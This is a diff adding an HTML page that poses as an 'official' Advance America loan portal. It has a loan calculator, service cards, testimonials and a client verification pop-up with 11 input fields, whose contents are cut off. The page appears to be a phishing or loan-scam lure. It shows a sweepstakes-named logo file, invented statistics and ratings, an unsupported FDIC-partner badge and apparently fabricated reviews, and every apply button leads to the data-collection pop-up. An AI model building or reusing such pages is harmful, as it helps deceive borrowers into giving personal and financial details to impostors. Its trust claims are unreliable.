@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advance America Officials - Trusted Financial & Loan Services</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Inter Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- FontAwesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        brand: {
+                            50: '#eef2ff',
+                            100: '#e0e7ff',
+                            600: '#4f46e5',
+                            750: '#3730a3',
+                            900: '#312e81',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="font-sans antialiased text-slate-800 bg-slate-50 selection:bg-brand-600 selection:text-white">
+
+    <!-- Top Notice Banner -->
+    <div class="bg-brand-900 text-white text-xs sm:text-sm py-2 px-4 text-center font-medium">
+        <div class="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-center gap-2">
+            <div class="flex items-center gap-2">
+                <span class="bg-amber-400 text-slate-900 text-xs px-2 py-0.5 rounded-full font-bold uppercase">Notice</span>
+                <span>Transparent, secure, and fast financial solutions tailored for your growth.</span>
+            </div>
+            <div class="flex items-center gap-4 text-slate-300">
+                <a href="#support" class="hover:text-white transition"><i class="fa-solid fa-headset mr-1"></i> 24/7 Support</a>
+                <a href="#login" onclick="openVerificationModal()" class="hover:text-white transition cursor-pointer"><i class="fa-solid fa-user-lock mr-1"></i> Client Portal</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header / Navbar -->
+   <header class="sticky top-0 z-50 bg-white/95 backdrop-blur-md shadow-sm border-b border-slate-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <!-- Brand Logo (Replaced 'AA' text with custom image/photo logo placeholder) -->
+            <div class="flex items-center gap-3">
+                <div class="w-12 h-12 rounded-xl bg-slate-100 border-2 border-dashed border-indigo-400 flex items-center justify-center text-slate-400 overflow-hidden shadow-sm relative group cursor-pointer" title="Click or insert your custom logo image">
+                    <!-- Placeholder Logo Image / User Logo slot -->
+                    <img src="Making the Holidays Work Sweepstakes.jpg" alt="Company Logo" class="w-full h-full object-cover">
+                </div>
+                <div>
+                    <span class="text-xl sm:text-2xl font-extrabold tracking-tight text-slate-900 block leading-none">Advance America</span>
+                    <span class="text-xs font-semibold tracking-wider text-brand-600 uppercase mt-1 block">Official Financial Services</span>
+                </div>
+            </div>
+
+            <!-- Desktop Navigation Links -->
+            <nav class="hidden md:flex items-center gap-8 font-medium text-slate-600 text-sm">
+                <a href="#services" class="hover:text-brand-600 transition">Services</a>
+                <a href="#calculator" class="hover:text-brand-600 transition">Loan Calculator</a>
+                <a href="#benefits" class="hover:text-brand-600 transition">Why Us</a>
+                <a href="#testimonials" class="hover:text-brand-600 transition">Reviews</a>
+                <a href="#faq" class="hover:text-brand-600 transition">FAQ</a>
+            </nav>
+
+            <!-- CTA Actions -->
+            <div class="hidden lg:flex items-center gap-3">
+                <button onclick="openVerificationModal()" class="px-6 py-2.5 text-sm font-semibold text-white bg-indigo-600 hover:bg-indigo-700 shadow-md shadow-indigo-200 rounded-xl transition transform active:scale-95 cursor-pointer">
+                    Apply Now
+                </button>
+            </div>
+
+            <!-- Mobile Menu Button -->
+            <button id="mobileMenuBtn" class="md:hidden text-slate-700 focus:outline-none p-2 rounded-lg hover:bg-slate-100">
+                <i class="fa-solid fa-bars text-xl"></i>
+            </button>
+        </div>
+
+        <!-- Mobile Menu Drawer -->
+        <div id="mobileMenu" class="hidden md:hidden bg-white border-b border-slate-200 px-4 pt-2 pb-6 space-y-3">
+            <a href="#services" class="block py-2 text-slate-700 font-medium hover:text-brand-600">Services</a>
+            <a href="#calculator" class="block py-2 text-slate-700 font-medium hover:text-brand-600">Loan Calculator</a>
+            <a href="#benefits" class="block py-2 text-slate-700 font-medium hover:text-brand-600">Why Us</a>
+            <a href="#testimonials" class="block py-2 text-slate-700 font-medium hover:text-brand-600">Reviews</a>
+            <a href="#faq" class="block py-2 text-slate-700 font-medium hover:text-brand-600">FAQ</a>
+            <div class="pt-4 flex flex-col gap-2">
+                <button onclick="openVerificationModal()" class="w-full text-center py-2.5 font-medium text-white bg-indigo-600 rounded-xl shadow cursor-pointer">Apply Now</button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section with Smiling People Photo -->
+    <section class="relative bg-gradient-to-b from-slate-900 via-indigo-950 to-slate-900 text-white overflow-hidden py-16 lg:py-24">
+        <!-- Abstract glowing background decor -->
+        <div class="absolute inset-0 opacity-20 bg-[radial-gradient(#4f46e5_1px,transparent_1px)] [background-size:24px_24px] pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+                <!-- Left column: Hero copy -->
+                <div class="lg:col-span-7 space-y-6 text-center lg:text-left">
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/15 backdrop-blur-md border border-white/20 text-xs sm:text-sm font-medium text-indigo-200">
+                        <i class="fa-solid fa-shield-halved text-emerald-400"></i> Trusted by Over 150,000+ Clients Nationwide
+                    </div>
+                    
+                    <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold tracking-tight leading-tight">
+                        Empowering Your Financial <span class="text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 to-amber-300">Future & Growth</span>
+                    </h1>
+                    
+                    <p class="text-base sm:text-lg text-slate-300 max-w-2xl mx-auto lg:mx-0">
+                        Fast, transparent, and flexible personal loans, small business funding, and financial advisory services designed to help you succeed without the traditional red tape.
+                    </p>
+
+                    <!-- Feature Pills -->
+                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 pt-2 text-left max-w-lg mx-auto lg:mx-0">
+                        <div class="flex items-center gap-2 bg-white/5 border border-white/10 rounded-xl p-3">
+                            <i class="fa-solid fa-bolt text-amber-400"></i>
+                            <span class="text-xs sm:text-sm font-semibold">Fast Approval</span>
+                        </div>
+                        <div class="flex items-center gap-2 bg-white/5 border border-white/10 rounded-xl p-3">
+                            <i class="fa-solid fa-percent text-indigo-400"></i>
+                            <span class="text-xs sm:text-sm font-semibold">Low Fixed Rates</span>
+                        </div>
+                        <div class="flex items-center gap-2 bg-white/5 border border-white/10 rounded-xl p-3 col-span-2 sm:col-span-1">
+                            <i class="fa-solid fa-lock text-emerald-400"></i>
+                            <span class="text-xs sm:text-sm font-semibold">100% Secure</span>
+                        </div>
+                    </div>
+
+                    <!-- Action buttons -->
+                    <div class="pt-4 flex flex-col sm:flex-row items-center justify-center lg:justify-start gap-4">
+                        <button onclick="openVerificationModal()" class="w-full sm:w-auto px-8 py-4 bg-indigo-600 hover:bg-indigo-500 text-white font-bold rounded-xl shadow-lg shadow-indigo-600/30 transition text-center flex items-center justify-center gap-2 cursor-pointer">
+                            <span>Apply For Funding Now</span>
+                            <i class="fa-solid fa-arrow-right"></i>
+                        </button>
+                        <a href="#services" class="w-full sm:w-auto px-8 py-4 bg-white/10 hover:bg-white/20 text-white font-bold rounded-xl backdrop-blur-md border border-white/20 transition text-center">
+                            Explore Services
+                        </a>
+                    </div>
+                </div>
+
+                <!-- Right column: High-quality image of smiling people + floating card -->
+                <div class="lg:col-span-5 relative">
+                    <div class="relative mx-auto max-w-md lg:max-w-none">
+                        <div class="rounded-3xl overflow-hidden shadow-2xl border-4 border-white/10 relative aspect-[4/3] lg:aspect-[3/4]">
+                            <img src="https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=800&q=80" 
+                                 alt="Smiling group of diverse business professionals and clients collaborating" 
+                                 class="w-full h-full object-cover transform hover:scale-105 transition duration-700"
+                                 onerror="this.src='https://placehold.co/600x800/312e81/ffffff?text=Happy+Clients'">
+                            <div class="absolute inset-0 bg-gradient-to-t from-slate-950/80 via-transparent to-transparent"></div>
+                            
+                            <!-- Floating Badge inside image -->
+                            <div class="absolute bottom-6 left-6 right-6 bg-slate-900/80 backdrop-blur-md p-4 rounded-2xl border border-white/15">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-10 h-10 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-lg font-bold">
+                                        <i class="fa-solid fa-check"></i>
+                                    </div>
+                                    <div>
+                                        <div class="text-white text-sm font-bold">98% Customer Satisfaction</div>
+                                        <div class="text-xs text-slate-300">Over $2.4 Billion funded responsibly</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Floating decorative card top-right -->
+                        <div class="absolute -top-6 -right-6 hidden sm:flex items-center gap-3 bg-white text-slate-900 px-4 py-3 rounded-2xl shadow-xl border border-slate-100 animate-bounce duration-1000">
+                            <div class="w-8 h-8 rounded-full bg-amber-100 text-amber-600 flex items-center justify-center font-bold">
+                                <i class="fa-solid fa-star"></i>
+                            </div>
+                            <div>
+                              <div class="text-xs font-bold text-slate-800">4.9 / 5.0 Rating</div>
+                              <div class="text-[10px] text-slate-500">Trustpilot & Verified Reviews</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Trust Badges Bar -->
+    <div class="bg-white border-b border-slate-200 py-8">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
+            <p class="text-xs font-bold tracking-widest text-slate-400 uppercase mb-6">Recognized & Secured By Industry Standards</p>
+            <div class="flex flex-wrap justify-center items-center gap-8 sm:gap-16 opacity-75 grayscale hover:grayscale-0 transition duration-300">
+                <div class="flex items-center gap-2 font-bold text-slate-700 text-lg">
+                    <i class="fa-solid fa-shield-check text-indigo-600 text-2xl"></i> SECURE SSL 256
+                </div>
+                <div class="flex items-center gap-2 font-bold text-slate-700 text-lg">
+                    <i class="fa-solid fa-landmark text-indigo-600 text-2xl"></i> FDIC PARTNER BANK
+                </div>
+                <div class="flex items-center gap-2 font-bold text-slate-700 text-lg">
+                    <i class="fa-solid fa-award text-amber-500 text-2xl"></i> TOP RATED 2026
+                </div>
+                <div class="flex items-center gap-2 font-bold text-slate-700 text-lg">
+                    <i class="fa-solid fa-headset text-indigo-600 text-2xl"></i> 24/7 SUPPORT
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loan Calculator -->
+    <section id="calculator" class="py-20 bg-slate-100">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-16">
+                <span class="text-brand-600 font-bold text-xs sm:text-sm uppercase tracking-wider bg-brand-50 px-3 py-1 rounded-full">Interactive Tool</span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-slate-900 mt-3">Quick Loan & Payment Calculator</h2>
+                <p class="text-slate-600 mt-3 text-base sm:text-lg">Estimate your monthly repayments instantly with our transparent calculator tool.</p>
+            </div>
+
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center bg-white rounded-3xl shadow-xl border border-slate-200 overflow-hidden p-6 sm:p-10">
+                <!-- Calculator inputs -->
+                <div class="lg:col-span-7 space-y-6">
+                    <div>
+                        <div class="flex justify-between items-center mb-2">
+                            <label for="loanAmount" class="font-bold text-slate-800 text-sm sm:text-base">Loan Amount</label>
+                            <span id="amountDisplay" class="font-extrabold text-indigo-600 text-lg sm:text-xl">$25,000</span>
+                        </div>
+                        <input type="range" id="loanAmount" min="1000" max="100000" step="1000" value="25000" 
+                               class="w-full h-2 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-indigo-600">
+                        <div class="flex justify-between text-xs text-slate-400 mt-1">
+                            <span>$1,000</span>
+                            <span>$100,000</span>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between items-center mb-2">
+                            <label for="loanTerm" class="font-bold text-slate-800 text-sm sm:text-base">Repayment Term</label>
+                            <span id="termDisplay" class="font-extrabold text-indigo-600 text-lg sm:text-xl">36 Months</span>
+                        </div>
+                        <input type="range" id="loanTerm" min="6" max="72" step="6" value="36" 
+                               class="w-full h-2 bg-slate-200 rounded-lg appearance-none cursor-pointer accent-indigo-600">
+                        <div class="flex justify-between text-xs text-slate-400 mt-1">
+                            <span>6 Months</span>
+                            <span>72 Months</span>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between items-center mb-2">
+                            <label for="creditScore" class="font-bold text-slate-800 text-sm sm:text-base">Estimated Credit Score</label>
+                            <span id="creditDisplay" class="font-extrabold text-emerald-600 text-base sm:text-lg">Good (700+)</span>
+                        </div>
+                        <select id="creditScore" class="w-full bg-slate-50 border border-slate-300 rounded-xl px-4 py-3 text-slate-800 font-medium focus:ring-2 focus:ring-indigo-600 focus:outline-none">
+                            <option value="0.08">Excellent (740+) - Best Rate</option>
+                            <option value="0.10" selected>Good (700 - 739)</option>
+                            <option value="0.14">Fair (650 - 699)</option>
+                            <option value="0.18">Standard (Below 650)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Calculator summary card -->
+                <div class="lg:col-span-5 bg-gradient-to-br from-indigo-950 to-slate-900 text-white rounded-2xl p-6 sm:p-8 flex flex-col justify-between shadow-lg">
+                    <div>
+                        <h3 class="text-lg font-bold text-indigo-200 mb-1">Estimated Monthly Payment</h3>
+                        <div id="monthlyPayment" class="text-4xl sm:text-5xl font-black text-amber-300 my-4">$784<span class="text-lg font-normal text-slate-300">/mo</span></div>
+                        
+                        <div class="space-y-3 pt-4 border-t border-white/15 text-sm text-slate-300">
+                            <div class="flex justify-between">
+                                <span>Principal Amount:</span>
+                                <span id="summaryPrincipal" class="font-semibold text-white">$25,000</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span>Estimated Interest Rate (APR):</span>
+                                <span id="summaryRate" class="font-semibold text-white">10.0%</span>
+                            </div>
+                            <div class="flex justify-between">
+                                <span>Total Estimated Repayment:</span>
+                                <span id="summaryTotal" class="font-semibold text-white">$28,248</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-8">
+                        <button onclick="openVerificationModal()" class="block w-full text-center py-3.5 bg-indigo-600 hover:bg-indigo-500 font-bold rounded-xl text-white shadow-lg shadow-indigo-600/30 transition cursor-pointer">
+                            Apply with These Terms
+                        </button>
+                        <p class="text-[11px] text-slate-400 text-center mt-3">Calculations are estimates. Final terms subject to client verification and approval.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section id="services" class="py-20 bg-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-16">
+                <span class="text-brand-600 font-bold text-xs sm:text-sm uppercase tracking-wider bg-brand-50 px-3 py-1 rounded-full">Our Solutions</span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-slate-900 mt-3">Comprehensive Financial Services</h2>
+                <p class="text-slate-600 mt-3 text-base sm:text-lg">Whether you are consolidating debt, expanding your business, or seeking advisory, we have tailored programs.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Service 1 -->
+                <div class="bg-slate-50 hover:bg-white border border-slate-200 hover:border-indigo-500 hover:shadow-xl rounded-3xl p-8 transition duration-300 flex flex-col justify-between group">
+                    <div>
+                        <div class="w-14 h-14 rounded-2xl bg-indigo-100 text-indigo-600 flex items-center justify-center text-2xl font-bold mb-6 group-hover:bg-indigo-600 group-hover:text-white transition">
+                            <i class="fa-solid fa-wallet"></i>
+                        </div>
+                        <h3 class="text-xl font-bold text-slate-900 mb-3">Personal Loans</h3>
+                        <p class="text-slate-600 text-sm leading-relaxed">Flexible personal loans from $1,000 to $100,000 with predictable fixed monthly payments and zero prepayment penalties.</p>
+                    </div>
+                    <div class="pt-6 mt-6 border-t border-slate-200 flex items-center justify-between">
+                        <span class="text-xs font-bold text-indigo-600 uppercase tracking-wider">Fixed Rates</span>
+                        <button onclick="openVerificationModal()" class="text-slate-900 group-hover:text-indigo-600 font-bold text-sm flex items-center gap-1 transition cursor-pointer">
+                            Apply Now <i class="fa-solid fa-arrow-right text-xs"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Service 2 -->
+                <div class="bg-slate-50 hover:bg-white border border-slate-200 hover:border-indigo-500 hover:shadow-xl rounded-3xl p-8 transition duration-300 flex flex-col justify-between group">
+                    <div>
+                        <div class="w-14 h-14 rounded-2xl bg-indigo-100 text-indigo-600 flex items-center justify-center text-2xl font-bold mb-6 group-hover:bg-indigo-600 group-hover:text-white transition">
+                            <i class="fa-solid fa-briefcase"></i>
+                        </div>
+                        <h3 class="text-xl font-bold text-slate-900 mb-3">Small Business Capital</h3>
+                        <p class="text-slate-600 text-sm leading-relaxed">Fuel your business growth, purchase inventory, or manage cash flow with our customized working capital facilities.</p>
+                    </div>
+                    <div class="pt-6 mt-6 border-t border-slate-200 flex items-center justify-between">
+                        <span class="text-xs font-bold text-indigo-600 uppercase tracking-wider">Up to $500k</span>
+                        <button onclick="openVerificationModal()" class="text-slate-900 group-hover:text-indigo-600 font-bold text-sm flex items-center gap-1 transition cursor-pointer">
+                            Apply Now <i class="fa-solid fa-arrow-right text-xs"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Service 3 -->
+                <div class="bg-slate-50 hover:bg-white border border-slate-200 hover:border-indigo-500 hover:shadow-xl rounded-3xl p-8 transition duration-300 flex flex-col justify-between group">
+                    <div>
+                        <div class="w-14 h-14 rounded-2xl bg-indigo-100 text-indigo-600 flex items-center justify-center text-2xl font-bold mb-6 group-hover:bg-indigo-600 group-hover:text-white transition">
+                            <i class="fa-solid fa-scale-balanced"></i>
+                        </div>
+                        <h3 class="text-xl font-bold text-slate-900 mb-3">Debt Consolidation</h3>
+                        <p class="text-slate-600 text-sm leading-relaxed">Combine multiple high-interest credit card balances and loans into one manageable monthly payment at a lower rate.</p>
+                    </div>
+                    <div class="pt-6 mt-6 border-t border-slate-200 flex items-center justify-between">
+                        <span class="text-xs font-bold text-indigo-600 uppercase tracking-wider">Save on Interest</span>
+                        <button onclick="openVerificationModal()" class="text-slate-900 group-hover:text-indigo-600 font-bold text-sm flex items-center gap-1 transition cursor-pointer">
+                            Apply Now <i class="fa-solid fa-arrow-right text-xs"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Why Us Section -->
+    <section id="benefits" class="py-20 bg-slate-900 text-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+                <div class="lg:col-span-6 space-y-6">
+                    <span class="text-indigo-400 font-bold text-xs sm:text-sm uppercase tracking-wider bg-white/10 px-3 py-1 rounded-full border border-white/20">The Advantage</span>
+                    <h2 class="text-3xl sm:text-4xl font-extrabold tracking-tight">Why Thousands of Clients Choose Advance America</h2>
+                    <p class="text-slate-300 text-base sm:text-lg">We combine institutional security with lightning-fast digital onboarding, ensuring you get the funds you need when you need them.</p>
+
+                    <div class="space-y-4 pt-2">
+                        <div class="flex items-start gap-4">
+                            <div class="w-10 h-10 rounded-xl bg-indigo-600/30 text-indigo-400 flex items-center justify-center font-bold flex-shrink-0 mt-1">
+                                <i class="fa-solid fa-check"></i>
+                            </div>
+                            <div>
+                                <h4 class="text-lg font-bold text-white">No Hidden Fees or Surprises</h4>
+                                <p class="text-sm text-slate-400">Complete transparency on interest rates, repayment schedules, and terms before you sign.</p>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-4">
+                            <div class="w-10 h-10 rounded-xl bg-indigo-600/30 text-indigo-400 flex items-center justify-center font-bold flex-shrink-0 mt-1">
+                                <i class="fa-solid fa-check"></i>
+                            </div>
+                            <div>
+                                <h4 class="text-lg font-bold text-white">Dedicated Financial Advisors</h4>
+                                <p class="text-sm text-slate-400">Get personalized guidance from certified professionals who understand your goals.</p>
+                            </div>
+                        </div>
+
+                        <div class="flex items-start gap-4">
+                            <div class="w-10 h-10 rounded-xl bg-indigo-600/30 text-indigo-400 flex items-center justify-center font-bold flex-shrink-0 mt-1">
+                                <i class="fa-solid fa-check"></i>
+                            </div>
+                            <div>
+                                <h4 class="text-lg font-bold text-white">Same-Day Funding Available</h4>
+                                <p class="text-sm text-slate-400">Once verified, funds can be directly wired to your bank account within 24 hours.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lg:col-span-6">
+                    <div class="grid grid-cols-2 gap-4">
+                        <div class="space-y-4">
+                            <div class="bg-white/5 border border-white/10 rounded-3xl p-6 text-center">
+                                <div class="text-3xl sm:text-4xl font-black text-amber-400 mb-1">$2.4B+</div>
+                                <div class="text-xs sm:text-sm text-slate-300">Total Funded Loans</div>
+                            </div>
+                            <div class="bg-indigo-600 rounded-3xl p-6 text-center text-white">
+                                <div class="text-3xl sm:text-4xl font-black mb-1">150k+</div>
+                                <div class="text-xs sm:text-sm text-indigo-100">Satisfied Borrowers</div>
+                            </div>
+                        </div>
+                        <div class="space-y-4 pt-8">
+                            <div class="bg-white/5 border border-white/10 rounded-3xl p-6 text-center">
+                                <div class="text-3xl sm:text-4xl font-black text-emerald-400 mb-1">99.8%</div>
+                                <div class="text-xs sm:text-sm text-slate-300">Data Security Record</div>
+                            </div>
+                            <div class="bg-white/5 border border-white/10 rounded-3xl p-6 text-center">
+                                <div class="text-3xl sm:text-4xl font-black text-indigo-400 mb-1">15+</div>
+                                <div class="text-xs sm:text-sm text-slate-300">Years of Excellence</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section id="testimonials" class="py-20 bg-slate-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-16">
+                <span class="text-brand-600 font-bold text-xs sm:text-sm uppercase tracking-wider bg-brand-50 px-3 py-1 rounded-full">Client Stories</span>
+                <h2 class="text-3xl sm:text-4xl font-extrabold text-slate-900 mt-3">Trusted by Real People & Businesses</h2>
+                <p class="text-slate-600 mt-3 text-base sm:text-lg">Read how our financial solutions have helped clients achieve their dreams and overcome obstacles.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <!-- Review 1 -->
+                <div class="bg-white border border-slate-200 rounded-3xl p-8 shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex text-amber-400 gap-1 mb-4 text-sm">
+                            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                        </div>
+                        <p class="text-slate-700 italic text-sm leading-relaxed">"Getting a consolidation loan through Advance America streamlined all my credit card debt into one single low monthly payment. The process was fast and professional!"</p>
+                    </div>
+                    <div class="flex items-center gap-3 pt-6 mt-6 border-t border-slate-100">
+                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80" alt="Sarah Jenkins" class="w-12 h-12 rounded-full object-cover">
+                        <div>
+                            <div class="font-bold text-slate-900 text-sm">Sarah Jenkins</div>
+                            <div class="text-xs text-slate-500">Small Business Owner, TX</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Review 2 -->
+                <div class="bg-white border border-slate-200 rounded-3xl p-8 shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex text-amber-400 gap-1 mb-4 text-sm">
+                            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                        </div>
+                        <p class="text-slate-700 italic text-sm leading-relaxed">"Their working capital loan saved our inventory timeline. Funds were deposited in under 24 hours. Their customer service team is top-tier."</p>
+                    </div>
+                    <div class="flex items-center gap-3 pt-6 mt-6 border-t border-slate-100">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=150&q=80" alt="Marcus Vance" class="w-12 h-12 rounded-full object-cover">
+                        <div>
+                            <div class="font-bold text-slate-900 text-sm">Marcus Vance</div>
+                            <div class="text-xs text-slate-500">Tech Entrepreneur, CA</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Review 3 -->
+                <div class="bg-white border border-slate-200 rounded-3xl p-8 shadow-sm flex flex-col justify-between">
+                    <div>
+                        <div class="flex text-amber-400 gap-1 mb-4 text-sm">
+                            <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
+                        </div>
+                        <p class="text-slate-700 italic text-sm leading-relaxed">"Transparent rates with no hidden surprises. The verification and onboarding flow was extremely smooth and clear. Highly recommended!"</p>
+                    </div>
+                    <div class="flex items-center gap-3 pt-6 mt-6 border-t border-slate-100">
+                        <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=150&q=80" alt="Elena Rostova" class="w-12 h-12 rounded-full object-cover">
+                        <div>
+                            <div class="font-bold text-slate-900 text-sm">Elena Rostova</div>
+                            <div class="text-xs text-slate-500">Consultant, NY</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer id="support" class="bg-slate-950 text-slate-400 text-sm py-16 border-t border-slate-800">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-10 mb-12">
+                <!-- Col 1: Brand Info -->
+                <div class="lg:col-span-2 space-y-4">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-600 to-indigo-400 flex items-center justify-center text-white font-black text-lg">
+                            <i class="fa-solid fa-shield-halved"></i>
+                        </div>
+                        <span class="text-xl font-extrabold text-white">Advance America </span>
+                    </div>
+                    <p class="text-xs text-slate-400 leading-relaxed max-w-sm">
+                        Providing secure, transparent, and responsive financial services and funding solutions nationwide. Committed to responsible lending and financial wellness.
+                    </p>
+                    <div class="flex items-center gap-4 text-white text-base pt-2">
+                        <a href="#" class="hover:text-indigo-400 transition"><i class="fa-brands fa-facebook-f"></i></a>
+                        <a href="#" class="hover:text-indigo-400 transition"><i class="fa-brands fa-twitter"></i></a>
+                        <a href="#" class="hover:text-indigo-400 transition"><i class="fa-brands fa-linkedin-in"></i></a>
+                        <a href="#" class="hover:text-indigo-400 transition"><i class="fa-brands fa-instagram"></i></a>
+                    </div>
+                </div>
+
+                <!-- Col 2: Services -->
+                <div>
+                    <h4 class="text-white font-bold text-xs uppercase tracking-wider mb-4">Services</h4>
+                    <ul class="space-y-2.5 text-xs">
+                        <li><a href="#services" class="hover:text-white transition">Personal Loans</a></li>
+                        <li><a href="#services" class="hover:text-white transition">Business Capital</a></li>
+                        <li><a href="#services" class="hover:text-white transition">Debt Consolidation</a></li>
+                        <li><a href="#services" class="hover:text-white transition">Financial Advisory</a></li>
+                    </ul>
+                </div>
+
+                <!-- Col 3: Company -->
+                <div>
+                    <h4 class="text-white font-bold text-xs uppercase tracking-wider mb-4">Company</h4>
+                    <ul class="space-y-2.5 text-xs">
+                        <li><a href="#benefits" class="hover:text-white transition">About Us</a></li>
+                        <li><a href="#testimonials" class="hover:text-white transition">Client Reviews</a></li>
+                        <li><a href="#" class="hover:text-white transition">Careers</a></li>
+                        <li><a href="#" class="hover:text-white transition">Press & Media</a></li>
+                    </ul>
+                </div>
+
+                <!-- Col 4: Legal & Contact -->
+                <div>
+                    <h4 class="text-white font-bold text-xs uppercase tracking-wider mb-4">Support</h4>
+                    <ul class="space-y-2.5 text-xs">
+                        <li><a href="#" class="hover:text-white transition">Help Center</a></li>
+                        <li><a href="#" class="hover:text-white transition">Privacy Policy</a></li>
+                        <li><a href="#" class="hover:text-white transition">Terms of Service</a></li>
+                        <li><a href="#" class="hover:text-white transition">Contact Us</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Disclaimer -->
+            <div class="pt-8 border-t border-slate-900 text-[11px] text-slate-500 leading-relaxed space-y-3">
+                <p><strong>Disclaimer:</strong> Advance America is a premier financial service portal and lender connection platform. Rates and terms vary based on applicant credit profile, income, debt-to-income ratio, and state regulations. All loans are subject to credit approval and verification.</p>
+                <div class="flex flex-col sm:flex-row justify-between items-center gap-4">
+                    <p>&copy; 2026 Advance America. All rights reserved.</p>
+                    <div class="flex items-center gap-4">
+                        <span class="flex items-center gap-1"><i class="fa-solid fa-shield-halved text-indigo-500"></i> 256-Bit SSL Encryption</span>
+                        <span class="flex items-center gap-1"><i class="fa-solid fa-lock text-emerald-500"></i> Secure Portal</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- CLIENT VERIFICATION MODAL WITH 11 INPUT BOXES -->
+    <div id="verificationModal" class="fixed inset-0 z-50 hidden bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto">
+        <div class="bg-white rounded-3xl shadow-2xl border border-slate-200 max-w-2xl w-full max-h-[90vh] overflow-y-auto p-6 sm:p-10 relative my-8">
+            <!-- Close Button -->
+            <button onclick="closeVerificationModal()" class="absolute top-6 right-6 w-10 h-10 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-600 flex items-center justify-center transition cursor-pointer">
